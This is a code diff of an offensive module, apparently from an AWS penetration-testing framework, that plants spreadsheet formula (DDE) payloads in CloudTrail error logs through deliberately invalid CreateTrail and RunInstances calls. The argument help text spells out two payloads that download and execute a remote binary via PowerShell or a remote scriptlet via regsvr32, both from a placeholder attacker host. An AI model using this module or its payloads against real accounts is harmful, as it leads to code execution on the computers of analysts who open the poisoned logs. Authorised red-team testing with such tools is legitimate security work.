@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import argparse
-
+from botocore.exceptions import ClientError
 
 module_info = {
     # Name of the module (should be the same as the filename)
@@ -30,7 +30,7 @@ module_info = {
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--regions', required=False, default=None, help='A comma-separated list of regions to target. The default is every region.')
+parser.add_argument('--regions', required=False, help='A comma-separated list of regions to target. The default is every region.')
 parser.add_argument('--payload', required=True, help='The formula payload to use. Some examples:\n This formula uses PowerShell to contact an external server to download and execute a binary file: =cmd|\' /C powershell Invoke-WebRequest "http://your-server.com/test.exe" -OutFile "$env:Temp\\shell.exe"; Start-Process "$env:Temp\\shell.exe"\'!A1\nThis formula contacts a remote server to download and execute a .sct file: =MSEXCEL|\'\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://your-server.com/SCTLauncher.sct scrobj.dll\'!\'\'')
 
 
@@ -41,72 +41,70 @@ def main(args, pacu_main):
     get_regions = pacu_main.get_regions
     ######
 
-    summary_data = {
-        'trail_attacks': 0,
-        'trail_fails': 0,
-        'instance_attacks': 0,
-        'instance_fails': 0
-    }
-    if 'regions' in args and args.regions is not None:
-        if len(args.regions) == 1:
-            regions = [args.regions]
-        else:
-            regions = args.regions.split(',')
+    summary_data = {'success': 0, 'fails': 0}
+    if args.regions:
+        regions = args.regions.split(',')
     else:
         regions = get_regions('cloudtrail')
 
     for region in regions:
         print('Starting region {}...'.format(region))
-
         print('  Starting CreateTrail attack...')
-
         client = pacu_main.get_boto3_client('cloudtrail', region)
-
         try:
             client.create_trail(
                 Name=args.payload,
                 S3BucketName=args.payload
             )
-            print('  Trail created. This most likely means your payload fit the parameters for a valid trail name (AKA didn\'t contain disallowed characters). Exiting...')  # It should error and move to the except block before printing this
-            return
-        except Exception as error:
-            if 'InvalidTrailNameException' in str(error):
-                print('Attack succeeded.')
-                summary_data['trail_attacks'] += 1
+            print('    FAILURE:')
+            print('      Trail created. Payload fit the parameters for a valid trail name')
+            print('      Exiting...')
+            summary_data['fails'] += 1
+            return summary_data
+        except ClientError as error:
+            code = error.response['Error']['Code']
+            if code == 'InvalidTrailNameException':
+                print('    Attack succeeded')
+                summary_data['success'] += 1
+                continue
             else:
-                print('  CreateTrail attack failed.')
-                summary_data['trail_fails'] += 1
-                print(error)
+                print('  FAILURE:')
+                if code == 'AccessDeniedException':
+                    print('    MISSING NEEDED PERMISSIONS')
+                else:
+                    print('    ' + str(code))
 
         print('  Starting RunInstances attack...')
-
         client = pacu_main.get_boto3_client('ec2', region)
-
         try:
             client.run_instances(
                 ImageId=args.payload,
                 MaxCount=1,
                 MinCount=1
             )
-        except Exception as error:
-            if 'InvalidAMIID' in str(error):
-                print('Attack succeeded.')
-                summary_data['instance_attacks'] += 1
+            print('    FAILURE:')
+            print('      Instance Launched. Payload fit the parameters for a valid ImageId')
+            print('      Exiting...')
+            summary_data['fails'] += 1
+            return summary_data
+        except ClientError as error:
+            code = error.response['Error']['Code']
+            if code == 'InvalidAMIID.Malformed':
+                print('    Attack succeeded')
+                summary_data['success'] += 1
+                continue
             else:
-                print('  RunInstances attack failed.')
-                summary_data['instance_fails'] += 1
-                print(error)
-
-        print('  {} finished.'.format(region))
-
-    print('{} completed.\n'.format(module_info['name']))
+                print('  FAILURE:')
+                if code == 'AccessDeniedException':
+                    print('    MISSING NEEDED PERMISSIONS')
+                else:
+                    print('    ' + str(code))
+        summary_data['fails'] += 1
+    print('\n{} completed.\n'.format(module_info['name']))
     return summary_data
 
 
 def summary(data, pacu_main):
-    out = '  {} total trails found.\n'.format(data['trail_attacks'] + data['trail_fails'])
-    out += '  {} trails attacked.\n'.format(data['trail_attacks'])
-    out += '  {} trails failed to be attacked.\n'.format(data['trail_fails'])
-    out += '  {} instances attacked.\n'.format(data['instance_attacks'])
-    out += '  {} instances failed to be attacked.'.format(data['instance_fails'])
+    out = '  {} CloudTrail regions(s) successfully attacked.\n'.format(data['success'])
+    out += '  {} CloudTrail regions(s) failed to be attacked.\n'.format(data['fails'])
     return out
